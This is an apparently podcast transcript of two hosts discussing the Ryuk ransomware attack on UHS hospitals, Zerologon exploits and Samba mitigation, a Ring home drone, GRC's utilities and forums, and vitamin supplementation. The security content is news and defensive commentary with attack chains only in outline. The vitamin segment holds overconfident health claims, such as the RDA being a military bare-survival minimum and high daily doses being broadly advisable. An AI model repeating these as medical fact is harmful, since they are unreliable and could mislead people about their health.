STEVE:  Okay.  Which is, again, Leo, you are just hitting these segues perfectly today.  Which brings us to UHS.  Over this past weekend, starting last Saturday night, to better avoid detection, the huge international 400 healthcare facility strong Universal Health Services, which is currently 330th place on the Forbes 500 list of the largest U.S. publicly traded companies, was hit by a huge Ryuk ransomware attack.  Early Sunday morning  they shut down systems at healthcare facilities across the U.S.  Based on reports from UHS employees, UHS hospitals in the U.S. including those in California, Florida, Texas, Arizona, and Washington, D.C., are left without access to computer and phone systems.  And in some of the reporting - I meant to put it in here, but I forgot - there was a map of these 400 facilities.  I mean, they're all over the country.  At the moment, the affected hospitals are redirecting ambulances and relocating patients in need of surgery to other nearby hospitals.



LEO:  Wonder how computerized these facilities are.



STEVE:  Completely.  They're completely reliant now on non-paper-based technology.  One of the reports said:  "When the attack happened, multiple antivirus programs were disabled and hard drives just lit up with activity.  After one minute or so of this, the computers logged out and shut down.  When you try to power back on, the computers just automatically shut back down.  We have no access to anything computer-based, including old labs, EKGs, or radiology studies.  We have no access to our PACS radiology system."  Employees were told to shut down all systems to block the attackers from reaching further devices on the network.



LEO:  It's a little late for that.



STEVE:  Uh-huh.  And sadly, Leo, four deaths have now been ascribed to the incident due to doctors needing to wait for lab results to arrive via courier since all electronic channels are down.



LEO:  This is a heinous crime.  Murder.



STEVE:  Yeah.  And reports are that during the cyberattack, files were being renamed to include the .ryk extension, the Ryuk ransomware hallmark.



LEO:  Wow.



STEVE:  Based on some information that was shared with BleepingComputer by Vitali Kremez of Advanced Intel, the attack on UHS systems likely started through a phishing attack.  According to Vitali, their Andariel, they have something they call the Andariel intelligence platform, detected both the Emotet and TrickBot trojans affecting UHS Inc. throughout 2020, and more recently this month.  The Emotet trojan is spreading via phishing emails containing malicious attachments that install the malware on a victim's computer.  After some time, Emotet will also install TrickBot, which ultimately opens a reverse shell to the Ryuk operators after harvesting sensitive information from compromised networks.  Once the Ryuk actors manually get access to the network, they start reconnaissance.  And after gaining admin credentials, they deploy ransomware payloads on network devices using PsExec or PowerShell Empire.  In other words, the way this is being done is well understood.  It's no mystery at all.



LEO:  So they knew about it.  Is there so much malware wandering around that you see a few Emotets, you go, yeah, there's just some more Emotets.



STEVE:  Yeah, exactly.  And much like the APT, remember, the Advanced Persistent Threat that gave Sony Entertainment so much trouble all those years ago, I would argue, to answer your question, it's virtually impossible to secure anything that's as sprawling as a 400-facility network where everybody has PCs with email, and all of their workstations are tied in in order to be able to do their job.  I don't know how you possibly make that secure.



UHS put out a statement to the public saying:  "The IT Network across Universal Health Services facilities is currently offline, due to an IT security issue.  We implement extensive IT security protocols and are working diligently with our IT security partners to restore IT operations as quickly as possible.  In the meantime, our facilities are using their established back-up processes including offline documentation methods.  Patient care continues to be delivered safely and effectively."  Those four deaths notwithstanding.  "No patient or employee data appears to have been accessed or copied or otherwise compromised."



So, you know, that was the standard publicly traded entity CYA notice.  But there was that huge outage in the U.K. that brought down its health system.  And here we have a massive, massive event.



LEO:  They're probably attacking hospitals because of that precise issue, which is you've got a lot of different computers with a lot of different operating systems in a variety of different patch states.



STEVE:  In a hierarchy of training of employees.  And remember, I mentioned it last week, there was an item that I didn't get into the show notes that talked about how studies have shown that "do not click that link" training fades after about six months.  So like you put everyone through training, and then for a while people are being diligent.  But then in comes that email from Aunt Martha, and it's like, oh, and you reach out and...



LEO:  I guess no scanner can stop all threats.  I mean, you try to stop malware from coming in via email at all; right?  



STEVE:  Well, yeah.  And the problem is the unknown threats.  We'll be talking about Zerologon in a minute.  That is now eight weeks old.  And three instances of Zerologon malware were found uploaded to VirusTotal.  Only a little over half of VirusTotal's scanners, like 73 of them.  Today, because I reran the scans last night, they got like 43 out of 73 hits.  



LEO:  Yeah, yeah.  I've said this all along.  No antivirus is more than 50 or 60% accurate.  



STEVE:  And that's the problem is that, because you're able to use encryption, because you're able to dynamically encrypt each instance of the malware so that there's no pattern, if you can't decrypt it when it goes through your scanner, as we've often said, proper encryption turns a file into maximum entropy noise.  There is no pattern to be seen.  So, I mean, it really just is - it's a scourge.  It's nothing less than that.



LEO:  Yeah.  And there's also this whole thing about the delay, the advanced persistent threat thing, the delay between the time you get into the system, the system's compromised, and the time you trigger the ransomware, that time can be used to figure out what the backup strategies are, to figure out where the backups are stored and to put malware on those systems.  I mean, if you have time - and then of course, lately, exfiltrate information that you can then also use in the blackmail; say, well, maybe you've got backups, but we still have all your customer data that we're going to release.  And we're seeing that happen a lot lately. 



STEVE:  And it's easy to say, oh, well, why don't they have egress filtering?



LEO:  Right, right.



STEVE:  They should be doing like bandwidth monitoring.  Okay.  How do you do that at 400 individual facilities?



LEO:  You just don't.  That's right.  Yup.



STEVE:  I mean, some are going to be extended care facilities.  Some are going to be, I mean, they're just a spectrum of different profiles.  And something gets in, you know, and sits quietly on a machine in the corner and waits until the evening when no one's around, and begins to reach out and explore.



LEO:  Explore.  And they mentioned that radiology system, their PACS radiology system.  Dollars to doughnuts that's running XP Embedded or something else ancient.



STEVE:  Uh-huh.



LEO:  Right?  Right.  And you know it's not air-gapped or it wouldn't be down.



STEVE:  Right.  Well, and Leo, it wouldn't be useful if it were air-gapped.



LEO:  It wouldn't be useful, yeah.



STEVE:  Because those big CAT scans are huge files, high-resolutions, multi-sliced.  They're big files.  They have to be on the network in order to schlep those files around.



LEO:  Right.  Yikes.



STEVE:  No, I mean, it's...



LEO:  It's terrifying.  And it's unconscionable.  I mean, the people who are doing this, obviously money means more to them than human lives.  It's very sad.



STEVE:  Well, and they hate the U.S.  I think it's fair to say.



LEO:  Oh, you think it's also political?  Yeah, maybe.  I don't know.



STEVE:  Well, if not political, not in terms of like presidential race political probably.  But, I mean, we know Russia is not a friend of the U.S.



LEO:  Right, right.



STEVE:  And a lot of this ends up getting traced back to formally sponsored attacks.  And it is weird, too, because when I read about like known Chinese state-sponsored attacks, I think, really?  I mean, we know this?  And we're doing nothing about it?  The only thing I can think is that we're doing it against them just as much as they are against us.



LEO:  Oh, I'm sure, yeah.



STEVE:  And so, well, in that case it's not like we're running around being Boy Scouts, and everybody else is throwing dirt at us.



LEO:  I wonder if at some point there won't be a cyber Geneva Convention where we agree that it's just too dangerous to use these weapons on each other.  



STEVE:  Well, like a form of the fact that nuclear arms have not been used since they were first used.



LEO:  Exactly, exactly.



STEVE:  Because everyone said, okay, look.



LEO:  It's mutually assured destruction.



STEVE:  Let's not all just nuke each other.



LEO:  Yeah.



STEVE:  Yeah.



LEO:  It's getting to be like that, where it's just escalating cyberwarfare.  The long-term threats, even the short-term threats are not good.



STEVE:  Well, and everyone's society is becoming increasingly dependent upon it.  I mean, it is - we're about to talk about what may not be incredibly useful technology, this flying spy cam.  But most of it is really important.  I mean, think about it.  Everyone listening to this podcast is able to think, I wonder what, blank, whatever.  Fill it in.  And yes, and go duck it.  Or google it.



LEO:  Oh, you can't say "go duck it."  No one knows what - I was like, what is - is he having a stroke?



STEVE:  Exactly.



LEO:  Go duck it.  What?  You're at DuckDuckGo.  Okay.  Go duck it.  I like it.  Let's do that from now on.  Okay.



STEVE:  So any question we have can be answered.  



LEO:  Right.  It's remarkable.



STEVE:  Just it's unbelievably powerful.



LEO:  We live in amazing times, good and bad.



STEVE:  Yeah.  Okay.  So under our rhetorically named "What could possible go wrong?" section, we have Amazon Ring's announcement Thursday of their autonomous home security flying webcam.



LEO:  Yu know, the thing that surprised me when they announced this, Lisa has forbidden cameras in the house forever.



STEVE:  Yes.



LEO:  Rightly so.  She doesn't know where that video is going.  I said, yeah, look at this, you wouldn't want this.  She's all, no, when are we going to get it?  I'm like, oh.  Because the camera's hidden in the base until it takes off.



STEVE:  True, true.



LEO:  Right?  But in order to use it you have to map your home.  You actually have to take it around and say, okay, this is the garage.  This is the kitchen.  You have to teach it the layout of your house.



STEVE:  Yeah.



LEO:  Like the first thing you do.



STEVE:  It's named the Always Home Cam.  It will cost $250, and it's slated to start shipping next year.  It is self-docking to allow it to recharge, and it's able to fly around its owner's home on pre-approved paths, as you mentioned.  And it's supposed to allow homeowners to check to see if they left a window open, forgot to turn the stove off.



LEO:  Yeah, I like that, yeah.



STEVE:  Or to check to make sure robbers aren't breaking in, presumably, because they're also billing it as a security feature.  And perhaps not surprisingly, this announcement has been met with some mixed feelings.



LEO:  Yes.



STEVE:  Rick Holland, the CISO and VP of Strategy at Digital Shadows, in an interview he told Threatpost:  "For privacy advocates, the concept of an untethered IoT device surveilling the house is a little disturbing.  Coupled with Ring's controversial privacy practices, the adoption of the drone could be low.  However, those that have already embraced the concept of in-house security cameras are likely to be excited.  The prospect of having a single drone monitor your house instead of multiple individual cameras would be alluring."



And this is exactly Lisa's position.  It's like, hey, instead of having cameras steadily looking out into our various rooms, this thing gives you total coverage, potentially, as long as it's you who are flying it around and looking at things.  Because consider the idea of it getting taken over and someone in Russia taking a stroll around your house using this thing.  I mean, really, that's what's going to happen.



Ring, for its part, said that they built in privacy into the physical design, noting that when the drone is docked in its charging base, the camera is physically blocked.  The camera's down on this - it's sort of like a - think of it as a big T-shape where the top of the T is a big square.  So it's a square with a square post that drops down from the center of this T, and the camera is down at the bottom of that.  So when this thing descends into its dock, the post is going into a square-shaped hole, thus preventing this thing from seeing anything.  So it's clear that the camera cannot be seen.



But it's funny, too, because they said:  "The device also has been designed to hum at a certain volume, so it's clear that the camera is in motion and recording."  And I thought, wait.  Hum?  Are you kidding me?  Has anyone here not ever heard a micro drone fly?



LEO:  Drones are loud, yeah.



STEVE:  You can't hear yourself think.  Generating the lift required using four tiny designer-approved props, because of course this thing has to look cute and right, that requires that they spin at thousands of revolutions per minute.  At least I suppose we don't need to worry about the thing creeping up on anyone and surprising them.  And then what occurred to me is what I want to know is whether no one who designs and tests these things has a dog or cat at home.  Because this thing would drive the pets insane.



LEO:  Yes, it would.



STEVE:  They would dive under the bed and never be seen again.



LEO:  Terrifying.



STEVE:  There's this thing flying down the hallway.



LEO:  You're right, I hadn't thought about that.  Absolutely.



STEVE:  Oh, my god.



LEO:  Wow.



STEVE:  Which brings us to another of this podcast's favorite aphorisms:  "Not everything that can be done, should be done."



LEO:  Yeah, yeah.



STEVE:  I had a neat link that I found posted to GRC's health newsgroup this morning that I wanted to share.  And in fact we have time, Leo, if we could play just the first three minutes of this podcast, I mean, the first three minutes of this YouTube video into the podcast, I think that our listeners would enjoy it.  The doctor speaking is a well-known U.K. M.D.  I've seen some other of his YouTube videos.  And I commend them to our listeners.  But this is really good.



[BEGIN YOUTUBE CLIP]



DR. JOHN CAMPBELL:  You are welcome to today's video.  Thank you for coming back.  Quite a few interesting new developments today.  But I'm going to start off with an intriguing story about Vitamin D.  Now, we mentioned a few days ago when we were looking at an interview with Dr. Anthony Fauci, the leading infectious diseases doctor in the states, he mentioned in the interview that he was personally taking Vitamin D and Vitamin C.  So I was intrigued to know the dose because is it the same as the official guidelines was kind of my main question.  And this is the story that's unfolded.



So this is from a Dr. Kari Hjelt, whose name I've probably pronounced wrong, doctor, sorry.  Anyway, he actually wrote to Dr. Fauci.  "You mentioned in a recent interview that you take Vitamin D supplement.  For the greater audience, it would be most interesting to know the dose that you use."  And as far as I can tell, this is completely genuine.  It looks like a completely genuine National Institutes of Health email.  And Dr. Fauci has written back and said 6,000 IU per day.  Fascinating.  And then Kari bounced that back on to me and has given me permission to share his name and details.  So appreciate the initiative that you've taken there.



Now, so what this is saying is Dr. Fauci is taking, as far as we can gather from this, 6,000 IU a day, which is equal to 150 micrograms.  So that's the dose he seems to be taking.  Now, we have mentioned a few times that when it's not sunny, I am personally taking that.



LEO:  Nice fountain pen.



DR. JOHN CAMPBELL:  Fifty micrograms.  So that's what I'm  taking.  Now, we have to stress, and I have to keep stressing this, I can't prescribe you a dose of Vitamin D for your requirement.  So this is not me prescribing to you.  It's not possible to prescribe on the Internet.  But I am reporting what I take.  Now, let's compare.



[END YOUTUBE CLIP]



LEO:  I've been taking 5,000 per your recommendation.



STEVE:  And that's what I'm taking.



LEO:  I think that's adequate.  But it's really interesting to compare this to the RDA for Vitamin D, which is one, what 30th of that amount?



STEVE:  It's 800 at this point, 800 IU versus 5,000.  And I think there's a broad misunderstanding about RDA and where it came from, you know, Recommended Daily Allowance, Recommended Dietary Allowance.  The RDA was developed by the military back a long time ago to determine the content of military rations.



LEO:  Oh.



STEVE:  They were trying to determine what they had to put in there to keep soldiers from dying from eating K-rations.  And so people assume that that's, like, recommended, that is to say, like it's what you need to be healthy.  It's not.  It's what you need to keep from dying.  It's the absolute minimum amount of things you need to take.  And so, yes, you won't get rickets.  You won't get scurvy.  I mean, the RDA will keep you from becoming unhealthful.  But there is a wide range between what keeps you from being sick and what you need for brimming health.  And so anyway, the RDA is like, yes, everybody should get at least this.  But often you should be getting way more than that.



LEO:  Much more, yeah.



STEVE:  And that's really the case.  And so yes, I just, you know, we keep seeing report after report after report that, especially now with COVID, it's so inexpensive, Leo, $15 for 360 little tiny drops of sunshine, little golden capsules, per person.



LEO:  Well, also I note that the recommended allowance does go up after 71.  And this is because, as you age, your ability to synthesize Vitamin D, which can only be done through the skin in sun, diminishes.



STEVE:  Well, and remember, in my famous Vitamin D podcast was that occurred after I had been naked sunbathing at noon and going to the lab daily to see whether I could develop any evidence of my own ability to synthesize Vitamin D.  I did, I sort of blocked off the patio so that I wouldn't be too - come to the attention of my neighbors.  But I did that.  And I think I did it for a month, and nothing happened.  I got zero effect.



LEO:  Yeah.  It's a lot easier to take that pill.  And there's other side effects to too much sun exposure.  That's the other side of this is, of late, most of us are slathering on the sunscreen, wearing wide-brimmed hats.  We're trying to stay out of the sun.  And so even if you're under 71, I would guess that the required amount of Vitamin D orally has gone up quite a bit.  Now, he said Vitamin C.  By the way, I'm going to watch Dr. John Campbell.  I'm going to watch him.  He's great.



STEVE:  Oh, he is really...



LEO:  I like his style.  He's not doing the big YouTube, da da da, hit the button, smash the dough.  He's just giving some straight facts, and he uses a very nice fountain pen.



STEVE:  He's a real scientist.  Yeah, he posted something maybe a month ago, also on the subject.  Maybe it was the genetics.  I don't remember.  But anyway, his stuff is really good.  So I can commend him as someone worth browsing around.



LEO:  Dr. John Campbell, and he's on YouTube.  Now, he also mentioned something about Vitamin C.  Does Fauci have anything to say about Vitamin C?



STEVE:  Don't know.  That wasn't a question that was asked.  But you're right, he did say both.



LEO:  Said something, yeah.  Because I'm taking, per your suggestion, a lot of Vitamin C.  Not as much as you.  But doing 3 grams a day.



STEVE:  I believe it's - I think it's another mistake that we're making by not having - people not having a lot more Vitamin C in their diet.



LEO:  And the problem with Vitamin C is you can't store it, so it gets excreted immediately.  So I'm titrating it.  Like Lorrie, I'm drinking it in my water, dissolving 3 grams in my water and drinking it all day, so I get a little bit every few minutes.



STEVE:  Yeah.  There's a strong case to be made is that we and fruit bats and guinea pigs are the only mammals that are not making our own Vitamin C.  The household dog and cat, giraffes, elephants, zebras, tigers, I mean, all other mammals synthesize it because it is such a powerful antioxidant for dealing with the consequences of our metabolism.  And in fact what I find fascinating is that our livers are trying to make it.  It's made from glucose in a six-stage process.  The glucose molecule is manipulated through six different enzymatic chains to come out as Vitamin C, where it then becomes useful.  And our liver is doing all of the first five.



But the last enzyme, that's called L-gulonolactone oxidase, if anyone's curious, it's missing from the - we know where the defect is on the human genome where back in our evolutionary past it got broken.  And it must have been that our diet then was so heavy in Vitamin C that losing the ability to synthesize it endogenously didn't matter.  We were getting it from diet.  But now we're eating steak that doesn't have any Vitamin C in it.  And so it's like, whoops.  And the problem is anything that kills us quickly we find a cure for, or we focus on it a lot.  It's the things that kill you really slowly that they just slip under the radar.  So anyway, yeah.



LEO:  Great stuff.  I'm going to watch more of him.  That's really...



STEVE:  Yeah, he's really great.  I do commend him to everybody.



LEO:  Dr. John Campbell.



STEVE:  This also just happened.  Someone posted a link in the spinrite.dev group with a note that was found out in the wild, actually on Reddit, about the InitDisk utility that I created along the way to getting us to SpinRite.  Remember that in order to use SpinRite you need to boot to DOS and then run SpinRite, which has always been and will continue for the foreseeable future to be a DOS utility.  That requires that you be able to set up a thumb drive and make it bootable.  There was no - I tried to go simple ways.  I ended up having to go down to what I call "bare metal," where I'm manually writing sectors on the physical device in order to prepare it, to establish a FAT format, to establish the partitions.  I did it all by hand.



But in the process what seemed to happen is that our initial testers were reporting that USB devices they had put in the bad bin, this thing was bringing back to life.  So anyway, this posting was titled on Reddit, and I've got a link to anyone who has questions - actually it's under Linux questions under Reddit.  It was titled "Stick is not working."  The poster said:  "I have formatted my stick with 'sudo cfdisk /dev/sdb.'  And after I have formatted it, it has not worked anymore.  Even after formatting it multiple times with cfdisk and gparted, it did not work.  I've even tried it with Windows, but it also did not work.



"I've also tried multiple instructions from websites that also did not work.  In gparted it says that the reasons might be, one, that the file system might be damaged; two, that the file system is unknown to gparted (which can't be true because I have formatted it with gparted multiple times)," he says in parens.  "Three, there is no file system.  Four, the /dev/sdb2 is missing."  And then underneath it, it said in all caps:  "PROBLEM SOLVED."  Because down in the thread, the first person to respond, this was - looks like DoktorS_DE.  So the first person to respond was roachh2, who said:  "It's probably damaged."  Then Patient-Hyena posted:  "Try GRC's InitDisk.  It is a Windows utility, but I have seen it work miracles."  So then DoktorS_DE, the original poster, replies:  "I will try that."  And then he followed that up with:  "It worked somehow.  Thank you very much."



So again, just a reminder to our listeners just sort of, you know, it's free.  And it is becoming sort of like the go-to solution for solving anything having to do with a USB device that won't boot.  If this thing can't make it boot, then I would argue, you know, I can't bring it back to life, give it a file system that you can then do a directory of and so forth, it really is dead.



LEO:  What file system does it write?  What is it doing?



STEVE:  It puts a FAT32 on.



LEO:  Okay.



STEVE:  And that's handy because of course that's universal.  Everybody is able to understand FAT32.



LEO:  Right, right.  And I wonder how it overcame whatever was going on.



STEVE:  Well, it just is a big powerful plow, and it goes and plows its own furrows.  It just doesn't care what's there.  It's very careful about making - the way I had it operate is you start the program and then, while it's watching your USB, you plug in the device that you want it to kill.



LEO:  Oh, interesting, oh.



STEVE:  Yeah.  That way there's no, like, oh, wait, did I reformat the wrong one?



LEO:  Which one, yes.  Yeah, that's smart, yeah.



STEVE:  And so it takes a physical action from the user.  And so it sort of walks you through the process step by step.  And then it just says, okay, say bye-bye, and it just wipes out what was there and then reestablishes a new kingdom.



LEO:  Windows only?  DOS?



STEVE:  Windows only, yeah.



LEO:  Windows only, okay.



STEVE:  And that's what this Linux guy, I mean, this was a Linux forum where the guy said, well, it is a Windows utility, but it may bring the thing back.  And we know it did.



The new GRC web forums are now up and running.  As we've been covering round after round of catastrophic WordPress add-on disasters, I've been growing more and more nervous about hosting my own public WordPress blog on my own servers.



LEO:  Yes.  As we know, that's risky.



STEVE:  Oh, lord.  It's just been a disaster.  It's difficult to be convinced of its safety without investing far more time in it than I want to.  And I'm not a prolific blogger.  This podcast audience gets pretty much everything I have to say, every week.  And aside from being here with everyone, I work over in GRC's newsgroups.  I only had a single blog posting in years.  And so, you know, the risk-reward ratio of hosting a WordPress presence on my own server was all wrong.  If I were to do it again, I would go back to letting WordPress host my blog on their server and keep WordPress as far away from my servers as possible.



Anyway, I realized that I could create a blog forum, my own personal blog forum, on GRC's new forum system and have everything then integrated into one place.  So that's what I've done.  With great relief, after setting that up, I completely shut down and removed WordPress from my site and sight - S-I-T-E and S-I-G-H-T.  Period.  So as for the rest of the new web forums, we're still in the staging stage, awaiting the finalization and readiness of the ReadSpeed low-level driver-testing mass-storage benchmark, which I will now be returning to work on finalizing.  I had to take a break in order to get the new forums all up and running, update my SPF DKIM and DMARC records so that I'm cryptographically signing outbound email.  There's a lot of prep that goes into getting everything ready.



But I am ready to invite our podcast listeners who would like to register and claim their userID to do so.  It's my intention that these forums will eventually grow to become GRC's and my own primary public presence for managing everything I do moving forward.  So we're establishing this as a significant asset for GRC.  There are still no links to the forum from GRC.  It's sort of nominally non-public.  And I even removed the forum's obvious registration UI, sort of to make it invitation-only.



The URL is simple.  It's forums.grc.com/register.  And so for our listeners, podcast listeners, https - ooh, I didn't have an "s" in my URL in the show notes, but it'll bounce you over to "s" if you don't - https://forums.grc.com/register.  And everybody's invited to go grab themselves a userID.  You don't have to register in order to get ReadSpeed or anything.  But if you imagine you might eventually want an ID there, you can get one before it's gone.



LEO:  Whose forum software are you using, just out of curiosity?



STEVE:  I'm using XenForo.



LEO:  Oh, so it's the same as before.



STEVE:  Yes, it is.  I really like XenForo, and I've gotten a lot of positive feedback from people.  Before I shut down the blogs, I sent one final blog and let everybody know:  Thanks for following me on the blog; I'm going to be over here from now on.  Oh, and that's what I wanted to mention.  Since we all hate email spam, I've configured the forum to never send any email notifications unless specifically requested.  So I would imagine our listeners would probably want to click the "watch" button at the top of my blog forum in order to receive a note when I post news there, as I certainly will be.  Although listening to this podcast you pretty much know what I'm up to anyway.



LEO:  Just got my name.



STEVE:  Cool, yay.



LEO:  Can't let LeoLaporte because I got it.  So if I had an account, as I did on the old forum, it doesn't propagate over to the new one.



STEVE:  Correct.



LEO:  Got it.



STEVE:  Does not cross over.



LEO:  Okay.



STEVE:  And I did get a bunch of people because first I opened it to the newsgroup denizens who have helped bring me to the point that we're getting ready to launch this software, and we'll be doing the same thing for SpinRite.  Many of them were SQRL users.  And of course if you did present your SQRL identity, you're just instantly registered.  I mean, many of them said, my god, this is the smoothest registration process I've ever seen.



LEO:  Yeah, it's nice.  Really well done, yeah.



STEVE:  So anyway, all that stuff is working, yeah.  So we're set and ready.  I will now go back to work on getting the software finalized, and I will be announcing it on my blog there and on the podcast when it happens.



LEO:  Nice.



STEVE:  Okay.  So as we know, last week one of the many topics that we covered was the so-called Zerologon vulnerability.  This week it has grown to become this week's main subject, for a good reason.  Last week I introduced us to Secura's earlier discovery and their responsible disclosure which resulted in a quiet patch as part of August's Patch Tuesday.  Secura waited six weeks, feeling that that was appropriate, giving them two Patch Tuesdays' lead.  And then they released their full description of the vulnerability.  Although they had created a working proof-of-concept demo, they deliberately chose to withhold it even then, six weeks downstream, to allow more time to pass for the August updates to be more widely deployed.



But while withholding the proof of concept was a nice gesture, the lesson to the industry now going forward is going to have to be that all anyone needs to turn a nebulous vulnerability description into an exploit is a sufficiently clear description such as Secura provided.  In other words, them not publishing a proof of concept didn't matter because within hours, and I mentioned this last week, of Secura's disclosure, multiple working Zerologon proof of concepts had been created, worked out, tested, and verified, and were there on GitHub.



One week ago, when I first talked about this, there were three publicly posted exploits.  Today there are more than the first page of results returned by Google.  I did a search.  Yes, I didn't duck it, I googled it.  We've got on GitHub from RiskSense Zerologon exploitation script.  We've got from Zero Networks Zerologon test for SMB and RPC.  Oh, and we'll be talking about that because you mentioned that last week, Leo, about Samba.  We've got the full coverage of that now.  This says "demonstrates that CVE-2020-1472 can be done via RPC/SMB and not only over RPC/TCP."  So they have something.



Then there's Invoke Zerologon.  There's the Zerologon testing script.  There's a 1472 proof of concept.  There's something called Zer0Dump, saying it's a proof-of-concept exploit tool for abusing the vulnerabilities associated with CVE-2020-1472 Zerologon in order to initiate a full system takeover of an unpatched Windows domain controller.  We've got the Zerologon exploit, tests whether a domain controller is vulnerable to the Zerologon attack.  If vulnerable, it will reset the domain controller's account password to an empty string.  Then we've got one just called CVE-2020-1472 from VoidSec, tests whether a domain controller is vulnerable, blah blah blah.  Same thing.



Silverfort's scanner for vulnerable domain controllers with Zerologon.  There's a scanner there.  We've also got from Rsmudge Zerologon BOF.  We have Add Exploit, adds an exploit module - ah, this is Metasploit - to the Metasploit framework.  He says this is a pure Ruby implementation leveraging the changes proposed.  And then there's a Ruby SMB deal.



So what started off as a few is now an explosion because this is not difficult to do.  And as we know, when they are easy to do, so it doesn't require climbing a high mountain, and there is dramatically large potential payoff and a huge potential target base, all of those conditions are met, the result is attacks.  Of course then we know that when I was talking about this first last Tuesday, it was just the prior midnight was the deadline for the DHS/CISA's emergency directive requiring all federal agencies, period, stop what you're doing, we don't care, no excuses, you have to apply this patch before midnight Monday night.



And, finally, the day after that podcast, so that was last Wednesday, Microsoft Security Intelligence account tweeted:  "Microsoft is actively tracking threat actor activity using exploits for CVE-2020-1472 Netlogon EoP" - they're calling it an elevation of privilege, which I think is cute - "vulnerability, dubbed Zerologon.  We have observed attacks where public exploits have been incorporated into attacker playbooks."



So of course from GitHub there they are, and they are immediately grabbed up by the malware guys and turned into active attacks.  And I note that their use of EoP, Elevation of Privilege, you know, I guess technically the Zerologon vulnerability is an elevation of privilege.  After you subvert the connection's encryption by using null initialization vectors, bypass the domain controller's authentication, null its password, and then logon as the domain admin, yeah, I'd say that you would have definitely elevated your privileges in this instance.  That sequence, as Secura put it, was one, spoof the client credential.  Two, disable RPC signing and sealing.  Three, spoof a call.  Four, change a domain's AD password.  Five, change the domain admin password.  And all that happens in a split second.



As I mentioned before, there were three files.  Microsoft Security also tweeted three hashes for three files which are known to be used in this exploit.  BleepingComputer tracked those three down by their hashes to the samples that had been uploaded to VirusTotal.  All three were named SharpZeroLogon.exe.  I've got the three links in the show notes.  And they show, respectively, 45 out of 71 detections, meaning that as of last night - because as I mentioned I refreshed them when these detection rates still seemed surprisingly low to me.



I mean, like - and there were some worrisome major AV providers that are still not seeing this - 45 out of 71 detections for the first, 42 out of 69 for the second, 43 out of 71 for the third.  So with those detection rates, certainly this raises those files well above any sort of false positive.  But they still seem really low, given the severity of the instance.  I mean, like a lot of people are seeing it.  But if you go click on those links, and I didn't bother to go through it all, but there are some major AV packages that are not finding it.  And I don't think I'd want to be relying on any of those AV tools that today, eight weeks later, were still blissfully unaware of the Zerologon threat at this stage.



BleepingComputer wrote:  "In one of the samples examined by BleepingComputer, and like other public exploits, the NTLM" - NT LAN Manager, which is what we're still using today - "the NTLM hash of the domain controller will be changed to" - and then they provide the hex, it starts out as 31 dog 6 charlie fox easy 0 dog 16 able easy 93 and so forth - "is the hash for an empty password."  So when you look at the domain controller's hash, it's like, whoopsie, that's a null password.



Okay.  So now for the Samba connection which was just coming to light last week.  It turns out that Samba, the open source implementation of Server Message Blocks, or SMB - thus the name Samba.  You add an "a" between the "S" and the "M" and an "a" on the end, and you've got Samba from SMB.  That's of course the SMB protocol available for Linux and Unix systems, which maps directory shares between Windows and the Unix and Linux systems and incorporates the Netlogon protocol; and, as a consequence of also offering Netlogon protocol, suffers from the vulnerability.



Red Hat had a good write-up about this from their perspective.  They said:  "Red Hat is responding to a vulnerability" - and there we have again 2020-1472 - "in the Microsoft Netlogon service.  Netlogon service is an authentication mechanism used in the Windows Client Authentication Architecture which verifies logon requests; and it registers, authenticates, and locates domain controllers.  The Netlogon service, as part of the domain controller functionality, implements Microsoft Netlogon Remote Protocol.  The implementation of Netlogon protocol contains a flaw that allows an authentication bypass.  This was reported and mitigated by Microsoft as CVE-2020-1472.  Since the flaw is a protocol-level flaw, and Samba implements the protocol, Samba is also vulnerable.



"The Microsoft Windows Netlogon Remote Protocol (MS-NRPC) reuses a known, static, zero-value initialization vector in AES-CFB8 mode."  Which of course we talked about last week.  "This allows an unauthenticated attacker to impersonate a domain-joined computer, including a domain controller, and potentially obtain domain admin privileges."  They said:  "In Windows environments, only the domain controller runs the Netlogon service accessible by clients.  This applies to Samba when it is used as a domain controller.  Samba Domain Controller role is implemented in both Active Directory mode and also the classic NT4-style mode.  The Red Hat Enterprise Linux (RHEL) version of the Samba package only provides classic NT4-style domain controllers.  An unauthenticated attacker with network access to a domain controller can impersonate any domain-joined computer, including a domain controller.  The attack can result in a denial of service and potentially allow an attacker to gain domain admin privileges."



Anyway, I'll skip some of the other stuff.  They get down to:  "The Samba suite supports secure channel establishment between domain members and domain controllers.  However, default behavior for secure Schannel prior to Samba 4.8 was to automatically negotiate secure channel only if a client supports it."  And we know what that means.  That's the classic security downgrade attack where the client pretends not to support the security, in which case Samba 4.8 says okay.  Anyway, they said:  "Since v4.8, the default behavior of Samba has been to insist on a secure channel for all clients, which is a sufficient fix against the known exploits of this attack.  This default is equivalent to having 'secure schannel = yes' in SMB config."



Anyway, I'll skip the rest of this.  Basically what this means is that, since v4.8 of Samba, which was released in March of 2018, so 2.5 years ago, if you have 4.8 you're fine because it insists on a secure channel to be established.  Any earlier versions of Samba that haven't had their smb.config file changed to say "server schannel = yes," or if it still says either "no" or "auto," those are vulnerable by default.  So that's what somebody wants to do.  If you've got actually any version of Samba, forget about version numbers, you'll know if you do.  You should have "server schannel = yes," regardless of version, and you're fine because, if that requirement is enforced as it then would be, you have no vulnerability problem.



The reason there could be a side effect is there could be some devices which we talked about last week that just cannot do Schannel negotiation.  So this is why Microsoft's fix at the moment is kind of a half step.  They will be fully enforcing it the beginning of next February.  For now, they're partially enforcing and logging.  The logging portion then allows IT to identify those devices that are opting to use non-Schannel, and then they can go see about fixing them and updating them.



But that's how Samba got involved is that Samba did a straight-across, okay, this is the protocol that Microsoft originally created for their file and printer sharing for NT LAN Man.  We're going to implement an open source version, and we're going to call it Samba.  And unfortunately they inherited the problem.



There is a cool fix.  Mitja Kolsec is CEO and co-founder of our friends 0patch, the people who rapidly step up and patch things that Microsoft hasn't patched or in some cases won't patch.  They have another of their terrific micropatches.  Sometimes they're a couple bytes long, which is just like you've got to shake your head.  This one was a whopping 29 bytes because they decided they were going to go back and fix Windows Server 2008 R2.



Anyway, I'm getting ahead of myself.  Their announcement blog post states, that is, the 0patch guys, it's numeric 0patch.com:  "The Zerologon vulnerability allows an attacker with network access to a Windows domain controller to quickly and reliably take complete control over the Windows domain.  As such, it is a perfect vulnerability for any attacker, and a nightmare for developers."  In fact, I've heard now that this perfect vulnerability is sort of making its way through the industry because this is.



So in an interview with Threatpost, Mitja explained, he said:  "Our micropatch was made for Windows Server 2008 R2, which reached end of support this January and stopped receiving Windows updates.  Many organizations are still using this server, and the only way for it to get extended security updates from Microsoft was to move it into the Azure cloud, which," he writes, "is an unacceptable option for most organizations."  He also added that 0patch is also working on porting their micropatch to various still-supported Windows servers for customers who, for various reasons, can't apply Microsoft's patch.



